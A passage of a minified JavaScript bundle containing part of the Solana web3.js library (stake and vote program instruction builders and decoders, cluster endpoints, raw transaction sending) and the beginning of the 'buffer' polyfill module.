                            stakePubkey: t,
                            authorizedPubkey: n,
                            splitStakePubkey: r,
                            basePubkey: i,
                            seed: o,
                            lamports: s
                        } = e, a = new hr;
                        return a.add(Rr.allocate({
                            accountPubkey: r,
                            basePubkey: i,
                            seed: o,
                            space: this.space,
                            programId: this.programId
                        })), a.add(this.splitInstruction({
                            stakePubkey: t,
                            authorizedPubkey: n,
                            splitStakePubkey: r,
                            lamports: s
                        }))
                    }
                    static merge(e) {
                        const {
                            stakePubkey: t,
                            sourceStakePubKey: n,
                            authorizedPubkey: r
                        } = e, i = Ir(Zo.Merge);
                        return (new hr).add({
                            keys: [{
                                pubkey: t,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: n,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: yr,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: _r,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: r,
                                isSigner: !0,
                                isWritable: !1
                            }],
                            programId: this.programId,
                            data: i
                        })
                    }
                    static withdraw(e) {
                        const {
                            stakePubkey: t,
                            authorizedPubkey: n,
                            toPubkey: r,
                            lamports: i,
                            custodianPubkey: o
                        } = e, s = Ir(Zo.Withdraw, {
                            lamports: i
                        }), a = [{
                            pubkey: t,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: r,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: yr,
                            isSigner: !1,
                            isWritable: !1
                        }, {
                            pubkey: _r,
                            isSigner: !1,
                            isWritable: !1
                        }, {
                            pubkey: n,
                            isSigner: !0,
                            isWritable: !1
                        }];
                        return o && a.push({
                            pubkey: o,
                            isSigner: !1,
                            isWritable: !1
                        }), (new hr).add({
                            keys: a,
                            programId: this.programId,
                            data: s
                        })
                    }
                    static deactivate(e) {
                        const {
                            stakePubkey: t,
                            authorizedPubkey: n
                        } = e, r = Ir(Zo.Deactivate);
                        return (new hr).add({
                            keys: [{
                                pubkey: t,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: yr,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: n,
                                isSigner: !0,
                                isWritable: !1
                            }],
                            programId: this.programId,
                            data: r
                        })
                    }
                }
                Xo.programId = new Wn("Stake11111111111111111111111111111111111111"), Xo.space = 200;
                class $o {
                    constructor(e, t, n, r) {
                        this.nodePubkey = void 0, this.authorizedVoter = void 0, this.authorizedWithdrawer = void 0, this.commission = void 0, this.nodePubkey = e, this.authorizedVoter = t, this.authorizedWithdrawer = n, this.commission = r
                    }
                }
                class es {
                    constructor() {}
                    static decodeInstructionType(e) {
                        this.checkProgramId(e.programId);
                        const t = Ne.Jq("instruction").decode(e.data);
                        let n;
                        for (const [r, i] of Object.entries(ts))
                            if (i.index == t) {
                                n = r;
                                break
                            }
                        if (!n) throw new Error("Instruction type incorrect; not a VoteInstruction");
                        return n
                    }
                    static decodeInitializeAccount(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 4);
                        const {
                            voteInit: t
                        } = xr(ts.InitializeAccount, e.data);
                        return {
                            votePubkey: e.keys[0].pubkey,
                            nodePubkey: e.keys[3].pubkey,
                            voteInit: new $o(new Wn(t.nodePubkey), new Wn(t.authorizedVoter), new Wn(t.authorizedWithdrawer), t.commission)
                        }
                    }
                    static decodeAuthorize(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3);
                        const {
                            newAuthorized: t,
                            voteAuthorizationType: n
                        } = xr(ts.Authorize, e.data);
                        return {
                            votePubkey: e.keys[0].pubkey,
                            authorizedPubkey: e.keys[2].pubkey,
                            newAuthorizedPubkey: new Wn(t),
                            voteAuthorizationType: {
                                index: n
                            }
                        }
                    }
                    static decodeAuthorizeWithSeed(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3);
                        const {
                            voteAuthorizeWithSeedArgs: {
                                currentAuthorityDerivedKeyOwnerPubkey: t,
                                currentAuthorityDerivedKeySeed: n,
                                newAuthorized: r,
                                voteAuthorizationType: i
                            }
                        } = xr(ts.AuthorizeWithSeed, e.data);
                        return {
                            currentAuthorityDerivedKeyBasePubkey: e.keys[2].pubkey,
                            currentAuthorityDerivedKeyOwnerPubkey: new Wn(t),
                            currentAuthorityDerivedKeySeed: n,
                            newAuthorizedPubkey: new Wn(r),
                            voteAuthorizationType: {
                                index: i
                            },
                            votePubkey: e.keys[0].pubkey
                        }
                    }
                    static decodeWithdraw(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3);
                        const {
                            lamports: t
                        } = xr(ts.Withdraw, e.data);
                        return {
                            votePubkey: e.keys[0].pubkey,
                            authorizedWithdrawerPubkey: e.keys[2].pubkey,
                            lamports: t,
                            toPubkey: e.keys[1].pubkey
                        }
                    }
                    static checkProgramId(e) {
                        if (!e.equals(rs.programId)) throw new Error("invalid instruction; programId is not VoteProgram")
                    }
                    static checkKeyLength(e, t) {
                        if (e.length < t) throw new Error(`invalid instruction; found ${e.length} keys, expected at least ${t}`)
                    }
                }
                const ts = Object.freeze({
                        InitializeAccount: {
                            index: 0,
                            layout: Ne.n_([Ne.Jq("instruction"), function() {
                                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "voteInit";
                                return Ne.n_([Xn("nodePubkey"), Xn("authorizedVoter"), Xn("authorizedWithdrawer"), Ne.u8("commission")], e)
                            }()])
                        },
                        Authorize: {
                            index: 1,
                            layout: Ne.n_([Ne.Jq("instruction"), Xn("newAuthorized"), Ne.Jq("voteAuthorizationType")])
                        },
                        Withdraw: {
                            index: 3,
                            layout: Ne.n_([Ne.Jq("instruction"), Ne.gM("lamports")])
                        },
                        AuthorizeWithSeed: {
                            index: 10,
                            layout: Ne.n_([Ne.Jq("instruction"), function() {
                                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "voteAuthorizeWithSeedArgs";
                                return Ne.n_([Ne.Jq("voteAuthorizationType"), Xn("currentAuthorityDerivedKeyOwnerPubkey"), er("currentAuthorityDerivedKeySeed"), Xn("newAuthorized")], e)
                            }()])
                        }
                    }),
                    ns = Object.freeze({
                        Voter: {
                            index: 0
                        },
                        Withdrawer: {
                            index: 1
                        }
                    });
                class rs {
                    constructor() {}
                    static initializeAccount(e) {
                        const {
                            votePubkey: t,
                            nodePubkey: n,
                            voteInit: r
                        } = e, i = Ir(ts.InitializeAccount, {
                            voteInit: {
                                nodePubkey: Rn(r.nodePubkey.toBuffer()),
                                authorizedVoter: Rn(r.authorizedVoter.toBuffer()),
                                authorizedWithdrawer: Rn(r.authorizedWithdrawer.toBuffer()),
                                commission: r.commission
                            }
                        }), o = {
                            keys: [{
                                pubkey: t,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: br,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: yr,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: n,
                                isSigner: !0,
                                isWritable: !1
                            }],
                            programId: this.programId,
                            data: i
                        };
                        return new fr(o)
                    }
                    static createAccount(e) {
                        const t = new hr;
                        return t.add(Rr.createAccount({
                            fromPubkey: e.fromPubkey,
                            newAccountPubkey: e.votePubkey,
                            lamports: e.lamports,
                            space: this.space,
                            programId: this.programId
                        })), t.add(this.initializeAccount({
                            votePubkey: e.votePubkey,
                            nodePubkey: e.voteInit.nodePubkey,
                            voteInit: e.voteInit
                        }))
                    }
                    static authorize(e) {
                        const {
                            votePubkey: t,
                            authorizedPubkey: n,
                            newAuthorizedPubkey: r,
                            voteAuthorizationType: i
                        } = e, o = Ir(ts.Authorize, {
                            newAuthorized: Rn(r.toBuffer()),
                            voteAuthorizationType: i.index
                        }), s = [{
                            pubkey: t,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: yr,
                            isSigner: !1,
                            isWritable: !1
                        }, {
                            pubkey: n,
                            isSigner: !0,
                            isWritable: !1
                        }];
                        return (new hr).add({
                            keys: s,
                            programId: this.programId,
                            data: o
                        })
                    }
                    static authorizeWithSeed(e) {
                        const {
                            currentAuthorityDerivedKeyBasePubkey: t,
                            currentAuthorityDerivedKeyOwnerPubkey: n,
                            currentAuthorityDerivedKeySeed: r,
                            newAuthorizedPubkey: i,
                            voteAuthorizationType: o,
                            votePubkey: s
                        } = e, a = Ir(ts.AuthorizeWithSeed, {
                            voteAuthorizeWithSeedArgs: {
                                currentAuthorityDerivedKeyOwnerPubkey: Rn(n.toBuffer()),
                                currentAuthorityDerivedKeySeed: r,
                                newAuthorized: Rn(i.toBuffer()),
                                voteAuthorizationType: o.index
                            }
                        }), u = [{
                            pubkey: s,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: yr,
                            isSigner: !1,
                            isWritable: !1
                        }, {
                            pubkey: t,
                            isSigner: !0,
                            isWritable: !1
                        }];
                        return (new hr).add({
                            keys: u,
                            programId: this.programId,
                            data: a
                        })
                    }
                    static withdraw(e) {
                        const {
                            votePubkey: t,
                            authorizedWithdrawerPubkey: n,
                            lamports: r,
                            toPubkey: i
                        } = e, o = Ir(ts.Withdraw, {
                            lamports: r
                        }), s = [{
                            pubkey: t,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: i,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: n,
                            isSigner: !0,
                            isWritable: !1
                        }];
                        return (new hr).add({
                            keys: s,
                            programId: this.programId,
                            data: o
                        })
                    }
                    static safeWithdraw(e, t, n) {
                        if (e.lamports > t - n) throw new Error("Withdraw will leave vote account with insuffcient funds.");
                        return rs.withdraw(e)
                    }
                }
                rs.programId = new Wn("Vote111111111111111111111111111111111111111"), rs.space = 3731;
                const is = new Wn("Va1idator1nfo111111111111111111111111111111"),
                    os = at({
                        name: ot(),
                        website: rt(ot()),
                        details: rt(ot()),
                        keybaseUsername: rt(ot())
                    });
                class ss {
                    constructor(e, t) {
                        this.key = void 0, this.info = void 0, this.key = e, this.info = t
                    }
                    static fromConfigData(e) {
                        let t = [...e];
                        if (2 !== nr(t)) return null;
                        const n = [];
                        for (let r = 0; r < 2; r++) {
                            const e = new Wn(t.slice(0, Fn));
                            t = t.slice(Fn);
                            const r = 1 === t.slice(0, 1)[0];
                            t = t.slice(1), n.push({
                                publicKey: e,
                                isSigner: r
                            })
                        }
                        if (n[0].publicKey.equals(is) && n[1].isSigner) {
                            const e = er().decode(r.lW.from(t)),
                                i = JSON.parse(e);
                            return qe(i, os), new ss(n[1].publicKey, i)
                        }
                        return null
                    }
                }
                const as = new Wn("Vote111111111111111111111111111111111111111"),
                    us = Ne.n_([Xn("nodePubkey"), Xn("authorizedWithdrawer"), Ne.u8("commission"), Ne._O(), Ne.A9(Ne.n_([Ne._O("slot"), Ne.Jq("confirmationCount")]), Ne.cv(Ne.Jq(), -8), "votes"), Ne.u8("rootSlotValid"), Ne._O("rootSlot"), Ne._O(), Ne.A9(Ne.n_([Ne._O("epoch"), Xn("authorizedVoter")]), Ne.cv(Ne.Jq(), -8), "authorizedVoters"), Ne.n_([Ne.A9(Ne.n_([Xn("authorizedPubkey"), Ne._O("epochOfLastAuthorizedSwitch"), Ne._O("targetEpoch")]), 32, "buf"), Ne._O("idx"), Ne.u8("isEmpty")], "priorVoters"), Ne._O(), Ne.A9(Ne.n_([Ne._O("epoch"), Ne._O("credits"), Ne._O("prevCredits")]), Ne.cv(Ne.Jq(), -8), "epochCredits"), Ne.n_([Ne._O("slot"), Ne._O("timestamp")], "lastTimestamp")]);
                class cs {
                    constructor(e) {
                        this.nodePubkey = void 0, this.authorizedWithdrawer = void 0, this.commission = void 0, this.rootSlot = void 0, this.votes = void 0, this.authorizedVoters = void 0, this.priorVoters = void 0, this.epochCredits = void 0, this.lastTimestamp = void 0, this.nodePubkey = e.nodePubkey, this.authorizedWithdrawer = e.authorizedWithdrawer, this.commission = e.commission, this.rootSlot = e.rootSlot, this.votes = e.votes, this.authorizedVoters = e.authorizedVoters, this.priorVoters = e.priorVoters, this.epochCredits = e.epochCredits, this.lastTimestamp = e.lastTimestamp
                    }
                    static fromAccountData(e) {
                        const t = us.decode(Rn(e), 4);
                        let n = t.rootSlot;
                        return t.rootSlotValid || (n = null), new cs({
                            nodePubkey: new Wn(t.nodePubkey),
                            authorizedWithdrawer: new Wn(t.authorizedWithdrawer),
                            commission: t.commission,
                            votes: t.votes,
                            rootSlot: n,
                            authorizedVoters: t.authorizedVoters.map(ls),
                            priorVoters: hs(t.priorVoters),
                            epochCredits: t.epochCredits,
                            lastTimestamp: t.lastTimestamp
                        })
                    }
                }

                function ls(e) {
                    let {
                        authorizedVoter: t,
                        epoch: n
                    } = e;
                    return {
                        epoch: n,
                        authorizedVoter: new Wn(t)
                    }
                }

                function fs(e) {
                    let {
                        authorizedPubkey: t,
                        epochOfLastAuthorizedSwitch: n,
                        targetEpoch: r
                    } = e;
                    return {
                        authorizedPubkey: new Wn(t),
                        epochOfLastAuthorizedSwitch: n,
                        targetEpoch: r
                    }
                }

                function hs(e) {
                    let {
                        buf: t,
                        idx: n,
                        isEmpty: r
                    } = e;
                    return r ? [] : [...t.slice(n + 1).map(fs), ...t.slice(0, n).map(fs)]
                }
                const ds = {
                    http: {
                        devnet: "http://api.devnet.solana.com",
                        testnet: "http://api.testnet.solana.com",
                        "mainnet-beta": "http://api.mainnet-beta.solana.com/"
                    },
                    https: {
                        devnet: "https://api.devnet.solana.com",
                        testnet: "https://api.testnet.solana.com",
                        "mainnet-beta": "https://api.mainnet-beta.solana.com/"
                    }
                };

                function ps(e, t) {
                    const n = !1 === t ? "http" : "https";
                    if (!e) return ds[n].devnet;
                    const r = ds[n][e];
                    if (!r) throw new Error(`Unknown ${n} cluster: ${e}`);
                    return r
                }
                async function ys(e, t, n, r) {
                    let i, o;
                    n && Object.prototype.hasOwnProperty.call(n, "lastValidBlockHeight") ? (i = n, o = r) : o = n;
                    const s = o && {
                            skipPreflight: o.skipPreflight,
                            preflightCommitment: o.preflightCommitment || o.commitment,
                            minContextSlot: o.minContextSlot
                        },
                        a = await e.sendRawTransaction(t, s),
                        u = o && o.commitment,
                        c = i ? e.confirmTransaction(i, u) : e.confirmTransaction(a, u),
                        l = (await c).value;
                    if (l.err) throw new Error(`Raw transaction ${a} failed (${JSON.stringify(l)})`);
                    return a
                }
                const gs = 1e9
            },
            8443: (e, t, n) => {
                "use strict";
                const r = n(2009),
                    i = n(4038),
                    o = "function" === typeof Symbol && "function" === typeof Symbol.for ? Symbol.for("nodejs.util.inspect.custom") : null;
                t.lW = u, t.h2 = 50;
                const s = 2147483647;

                function a(e) {
                    if (e > s) throw new RangeError('The value "' + e + '" is invalid for option "size"');
                    const t = new Uint8Array(e);
                    return Object.setPrototypeOf(t, u.prototype), t
                }

                function u(e, t, n) {
                    if ("number" === typeof e) {
                        if ("string" === typeof t) throw new TypeError('The "string" argument must be of type string. Received type number');
                        return f(e)
                    }
                    return c(e, t, n)
                }

                function c(e, t, n) {
                    if ("string" === typeof e) return function(e, t) {
                        "string" === typeof t && "" !== t || (t = "utf8");
                        if (!u.isEncoding(t)) throw new TypeError("Unknown encoding: " + t);
                        const n = 0 | y(e, t);
                        let r = a(n);
                        const i = r.write(e, t);
                        i !== n && (r = r.slice(0, i));
                        return r
                    }(e, t);
                    if (ArrayBuffer.isView(e)) return function(e) {
                        if (Y(e, Uint8Array)) {
                            const t = new Uint8Array(e);
                            return d(t.buffer, t.byteOffset, t.byteLength)
                        }
                        return h(e)
                    }(e);
                    if (null == e) throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof e);
                    if (Y(e, ArrayBuffer) || e && Y(e.buffer, ArrayBuffer)) return d(e, t, n);
                    if ("undefined" !== typeof SharedArrayBuffer && (Y(e, SharedArrayBuffer) || e && Y(e.buffer, SharedArrayBuffer))) return d(e, t, n);
                    if ("number" === typeof e) throw new TypeError('The "value" argument must not be of type number. Received type number');
                    const r = e.valueOf && e.valueOf();
                    if (null != r && r !== e) return u.from(r, t, n);
                    const i = function(e) {
                        if (u.isBuffer(e)) {
                            const t = 0 | p(e.length),
                                n = a(t);
                            return 0 === n.length || e.copy(n, 0, 0, t), n
                        }
                        if (void 0 !== e.length) return "number" !== typeof e.length || Z(e.length) ? a(0) : h(e);
                        if ("Buffer" === e.type && Array.isArray(e.data)) return h(e.data)
                    }(e);
                    if (i) return i;
                    if ("undefined" !== typeof Symbol && null != Symbol.toPrimitive && "function" === typeof e[Symbol.toPrimitive]) return u.from(e[Symbol.toPrimitive]("string"), t, n);
                    throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof e)
                }

                function l(e) {
                    if ("number" !== typeof e) throw new TypeError('"size" argument must be of type number');
                    if (e < 0) throw new RangeError('The value "' + e + '" is invalid for option "size"')
                }

                function f(e) {
                    return l(e), a(e < 0 ? 0 : 0 | p(e))
                }

                function h(e) {
                    const t = e.length < 0 ? 0 : 0 | p(e.length),
                        n = a(t);
                    for (let r = 0; r < t; r += 1) n[r] = 255 & e[r];
                    return n
                }

                function d(e, t, n) {
                    if (t < 0 || e.byteLength < t) throw new RangeError('"offset" is outside of buffer bounds');
                    if (e.byteLength < t + (n || 0)) throw new RangeError('"length" is outside of buffer bounds');
                    let r;
                    return r = void 0 === t && void 0 === n ? new Uint8Array(e) : void 0 === n ? new Uint8Array(e, t) : new Uint8Array(e, t, n), Object.setPrototypeOf(r, u.prototype), r
                }

                function p(e) {
                    if (e >= s) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + s.toString(16) + " bytes");
                    return 0 | e
                }

                function y(e, t) {
                    if (u.isBuffer(e)) return e.length;
                    if (ArrayBuffer.isView(e) || Y(e, ArrayBuffer)) return e.byteLength;
                    if ("string" !== typeof e) throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof e);
                    const n = e.length,
                        r = arguments.length > 2 && !0 === arguments[2];
                    if (!r && 0 === n) return 0;
                    let i = !1;
                    for (;;) switch (t) {
                        case "ascii":
                        case "latin1":
                        case "binary":
                            return n;
                        case "utf8":
                        case "utf-8":
                            return V(e).length;
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return 2 * n;
                        case "hex":
                            return n >>> 1;
                        case "base64":
                            return Q(e).length;
                        default:
                            if (i) return r ? -1 : V(e).length;
                            t = ("" + t).toLowerCase(), i = !0
                    }
                }

                function g(e, t, n) {
                    let r = !1;
                    if ((void 0 === t || t < 0) && (t = 0), t > this.length) return "";
                    if ((void 0 === n || n > this.length) && (n = this.length), n <= 0) return "";
                    if ((n >>>= 0) <= (t >>>= 0)) return "";
                    for (e || (e = "utf8");;) switch (e) {
                        case "hex":
                            return T(this, t, n);
                        case "utf8":
                        case "utf-8":
                            return I(this, t, n);
                        case "ascii":
                            return M(this, t, n);
                        case "latin1":
                        case "binary":
                            return B(this, t, n);
                        case "base64":
                            return S(this, t, n);
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return O(this, t, n);
                        default:
                            if (r) throw new TypeError("Unknown encoding: " + e);
                            e = (e + "").toLowerCase(), r = !0
                    }
                }

                function m(e, t, n) {
                    const r = e[t];
                    e[t] = e[n], e[n] = r
                }

                function w(e, t, n, r, i) {
                    if (0 === e.length) return -1;
                    if ("string" === typeof n ? (r = n, n = 0) : n > 2147483647 ? n = 2147483647 : n < -2147483648 && (n = -2147483648), Z(n = +n) && (n = i ? 0 : e.length - 1), n < 0 && (n = e.length + n), n >= e.length) {
                        if (i) return -1;
                        n = e.length - 1
                    } else if (n < 0) {
                        if (!i) return -1;
                        n = 0
                    }
                    if ("string" === typeof t && (t = u.from(t, r)), u.isBuffer(t)) return 0 === t.length ? -1 : b(e, t, n, r, i);
                    if ("number" === typeof t) return t &= 255, "function" === typeof Uint8Array.prototype.indexOf ? i ? Uint8Array.prototype.indexOf.call(e, t, n) : Uint8Array.prototype.lastIndexOf.call(e, t, n) : b(e, [t], n, r, i);
                    throw new TypeError("val must be string, number or Buffer")
                }

                function b(e, t, n, r, i) {
                    let o, s = 1,
                        a = e.length,
                        u = t.length;
                    if (void 0 !== r && ("ucs2" === (r = String(r).toLowerCase()) || "ucs-2" === r || "utf16le" === r || "utf-16le" === r)) {
                        if (e.length < 2 || t.length < 2) return -1;
                        s = 2, a /= 2, u /= 2, n /= 2
                    }

                    function c(e, t) {
                        return 1 === s ? e[t] : e.readUInt16BE(t * s)
                    }
                    if (i) {
                        let r = -1;
                        for (o = n; o < a; o++)
                            if (c(e, o) === c(t, -1 === r ? 0 : o - r)) {
                                if (-1 === r && (r = o), o - r + 1 === u) return r * s
                            } else -1 !== r && (o -= o - r), r = -1
                    } else
                        for (n + u > a && (n = a - u), o = n; o >= 0; o--) {
                            let n = !0;
                            for (let r = 0; r < u; r++)
                                if (c(e, o + r) !== c(t, r)) {
                                    n = !1;
                                    break
                                }
                            if (n) return o
                        }
                    return -1
                }

                function v(e, t, n, r) {
                    n = Number(n) || 0;
                    const i = e.length - n;
                    r ? (r = Number(r)) > i && (r = i) : r = i;
                    const o = t.length;
                    let s;
                    for (r > o / 2 && (r = o / 2), s = 0; s < r; ++s) {
                        const r = parseInt(t.substr(2 * s, 2), 16);
                        if (Z(r)) return s;
                        e[n + s] = r
                    }
                    return s
                }

                function A(e, t, n, r) {
                    return G(V(t, e.length - n), e, n, r)
                }

                function k(e, t, n, r) {
                    return G(function(e) {
                        const t = [];
                        for (let n = 0; n < e.length; ++n) t.push(255 & e.charCodeAt(n));
                        return t
                    }(t), e, n, r)
                }

                function _(e, t, n, r) {
                    return G(Q(t), e, n, r)
                }

                function E(e, t, n, r) {
                    return G(function(e, t) {
                        let n, r, i;
                        const o = [];
                        for (let s = 0; s < e.length && !((t -= 2) < 0); ++s) n = e.charCodeAt(s), r = n >> 8, i = n % 256, o.push(i), o.push(r);
                        return o
                    }(t, e.length - n), e, n, r)
                }

                function S(e, t, n) {
                    return 0 === t && n === e.length ? r.fromByteArray(e) : r.fromByteArray(e.slice(t, n))
                }

                function I(e, t, n) {
                    n = Math.min(e.length, n);
                    const r = [];
                    let i = t;
                    for (; i < n;) {
                        const t = e[i];
                        let o = null,
                            s = t > 239 ? 4 : t > 223 ? 3 : t > 191 ? 2 : 1;
                        if (i + s <= n) {
                            let n, r, a, u;
                            switch (s) {
                                case 1:
                                    t < 128 && (o = t);
                                    break;
                                case 2:
                                    n = e[i + 1], 128 === (192 & n) && (u = (31 & t) << 6 | 63 & n, u > 127 && (o = u));
                                    break;
                                case 3:
                                    n = e[i + 1], r = e[i + 2], 128 === (192 & n) && 128 === (192 & r) && (u = (15 & t) << 12 | (63 & n) << 6 | 63 & r, u > 2047 && (u < 55296 || u > 57343) && (o = u));
                                    break;
                                case 4:
                                    n = e[i + 1], r = e[i + 2], a = e[i + 3], 128 === (192 & n) && 128 === (192 & r) && 128 === (192 & a) && (u = (15 & t) << 18 | (63 & n) << 12 | (63 & r) << 6 | 63 & a, u > 65535 && u < 1114112 && (o = u))
                            }
                        }
                        null === o ? (o = 65533, s = 1) : o > 65535 && (o -= 65536, r.push(o >>> 10 & 1023 | 55296), o = 56320 | 1023 & o), r.push(o), i += s
                    }
                    return function(e) {
                        const t = e.length;
                        if (t <= x) return String.fromCharCode.apply(String, e);
                        let n = "",
                            r = 0;
                        for (; r < t;) n += String.fromCharCode.apply(String, e.slice(r, r += x));
                        return n
                    }(r)
                }
                u.TYPED_ARRAY_SUPPORT = function() {
                    try {
                        const e = new Uint8Array(1),
                            t = {
                                foo: function() {
                                    return 42
                                }
                            };
                        return Object.setPrototypeOf(t, Uint8Array.prototype), Object.setPrototypeOf(e, t), 42 === e.foo()
                    } catch (e) {
                        return !1
                    }
                }(), u.TYPED_ARRAY_SUPPORT || "undefined" === typeof console || "function" !== typeof console.error || console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."), Object.defineProperty(u.prototype, "parent", {
                    enumerable: !0,
                    get: function() {
                        if (u.isBuffer(this)) return this.buffer
                    }
                }), Object.defineProperty(u.prototype, "offset", {
                    enumerable: !0,
                    get: function() {
                        if (u.isBuffer(this)) return this.byteOffset
                    }
                }), u.poolSize = 8192, u.from = function(e, t, n) {
                    return c(e, t, n)
                }, Object.setPrototypeOf(u.prototype, Uint8Array.prototype), Object.setPrototypeOf(u, Uint8Array), u.alloc = function(e, t, n) {
                    return function(e, t, n) {
                        return l(e), e <= 0 ? a(e) : void 0 !== t ? "string" === typeof n ? a(e).fill(t, n) : a(e).fill(t) : a(e)
                    }(e, t, n)
                }, u.allocUnsafe = function(e) {
                    return f(e)
                }, u.allocUnsafeSlow = function(e) {
                    return f(e)
                }, u.isBuffer = function(e) {
                    return null != e && !0 === e._isBuffer && e !== u.prototype
                }, u.compare = function(e, t) {
                    if (Y(e, Uint8Array) && (e = u.from(e, e.offset, e.byteLength)), Y(t, Uint8Array) && (t = u.from(t, t.offset, t.byteLength)), !u.isBuffer(e) || !u.isBuffer(t)) throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
                    if (e === t) return 0;
                    let n = e.length,
                        r = t.length;
                    for (let i = 0, o = Math.min(n, r); i < o; ++i)
                        if (e[i] !== t[i]) {
                            n = e[i], r = t[i];
                            break
                        }
                    return n < r ? -1 : r < n ? 1 : 0
                }, u.isEncoding = function(e) {
                    switch (String(e).toLowerCase()) {
                        case "hex":
                        case "utf8":
                        case "utf-8":
                        case "ascii":
                        case "latin1":
                        case "binary":
                        case "base64":
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return !0;
                        default:
                            return !1
                    }
                }, u.concat = function(e, t) {
                    if (!Array.isArray(e)) throw new TypeError('"list" argument must be an Array of Buffers');
                    if (0 === e.length) return u.alloc(0);
                    let n;
                    if (void 0 === t)
                        for (t = 0, n = 0; n < e.length; ++n) t += e[n].length;
                    const r = u.allocUnsafe(t);
                    let i = 0;
                    for (n = 0; n < e.length; ++n) {
                        let t = e[n];
                        if (Y(t, Uint8Array)) i + t.length > r.length ? (u.isBuffer(t) || (t = u.from(t)), t.copy(r, i)) : Uint8Array.prototype.set.call(r, t, i);
                        else {
                            if (!u.isBuffer(t)) throw new TypeError('"list" argument must be an Array of Buffers');
                            t.copy(r, i)
                        }
                        i += t.length
                    }
                    return r
                }, u.byteLength = y, u.prototype._isBuffer = !0, u.prototype.swap16 = function() {
                    const e = this.length;
                    if (e % 2 !== 0) throw new RangeError("Buffer size must be a multiple of 16-bits");
                    for (let t = 0; t < e; t += 2) m(this, t, t + 1);
                    return this
                }, u.prototype.swap32 = function() {
                    const e = this.length;
                    if (e % 4 !== 0) throw new RangeError("Buffer size must be a multiple of 32-bits");
                    for (let t = 0; t < e; t += 4) m(this, t, t + 3), m(this, t + 1, t + 2);
                    return this
                }, u.prototype.swap64 = function() {
                    const e = this.length;
                    if (e % 8 !== 0) throw new RangeError("Buffer size must be a multiple of 64-bits");
                    for (let t = 0; t < e; t += 8) m(this, t, t + 7), m(this, t + 1, t + 6), m(this, t + 2, t + 5), m(this, t + 3, t + 4);
                    return this
                }, u.prototype.toString = function() {
                    const e = this.length;
                    return 0 === e ? "" : 0 === arguments.length ? I(this, 0, e) : g.apply(this, arguments)
                }, u.prototype.toLocaleString = u.prototype.toString, u.prototype.equals = function(e) {
                    if (!u.isBuffer(e)) throw new TypeError("Argument must be a Buffer");
                    return this === e || 0 === u.compare(this, e)
                }, u.prototype.inspect = function() {
                    let e = "";
                    const n = t.h2;
                    return e = this.toString("hex", 0, n).replace(/(.{2})/g, "$1 ").trim(), this.length > n && (e += " ... "), "<Buffer " + e + ">"
                }, o && (u.prototype[o] = u.prototype.inspect), u.prototype.compare = function(e, t, n, r, i) {
                    if (Y(e, Uint8Array) && (e = u.from(e, e.offset, e.byteLength)), !u.isBuffer(e)) throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof e);
                    if (void 0 === t && (t = 0), void 0 === n && (n = e ? e.length : 0), void 0 === r && (r = 0), void 0 === i && (i = this.length), t < 0 || n > e.length || r < 0 || i > this.length) throw new RangeError("out of range index");
                    if (r >= i && t >= n) return 0;
                    if (r >= i) return -1;
                    if (t >= n) return 1;
                    if (this === e) return 0;
                    let o = (i >>>= 0) - (r >>>= 0),
                        s = (n >>>= 0) - (t >>>= 0);
                    const a = Math.min(o, s),
                        c = this.slice(r, i),
                        l = e.slice(t, n);
                    for (let u = 0; u < a; ++u)
                        if (c[u] !== l[u]) {
                            o = c[u], s = l[u];
                            break
                        }
                    return o < s ? -1 : s < o ? 1 : 0
                }, u.prototype.includes = function(e, t, n) {
                    return -1 !== this.indexOf(e, t, n)
                }, u.prototype.indexOf = function(e, t, n) {
                    return w(this, e, t, n, !0)
                }, u.prototype.lastIndexOf = function(e, t, n) {
                    return w(this, e, t, n, !1)
                }, u.prototype.write = function(e, t, n, r) {
                    if (void 0 === t) r = "utf8", n = this.length, t = 0;
                    else if (void 0 === n && "string" === typeof t) r = t, n = this.length, t = 0;
                    else {
                        if (!isFinite(t)) throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                        t >>>= 0, isFinite(n) ? (n >>>= 0, void 0 === r && (r = "utf8")) : (r = n, n = void 0)
                    }
                    const i = this.length - t;
                    if ((void 0 === n || n > i) && (n = i), e.length > 0 && (n < 0 || t < 0) || t > this.length) throw new RangeError("Attempt to write outside buffer bounds");
                    r || (r = "utf8");
                    let o = !1;
                    for (;;) switch (r) {
                        case "hex":
                            return v(this, e, t, n);
                        case "utf8":
                        case "utf-8":
                            return A(this, e, t, n);
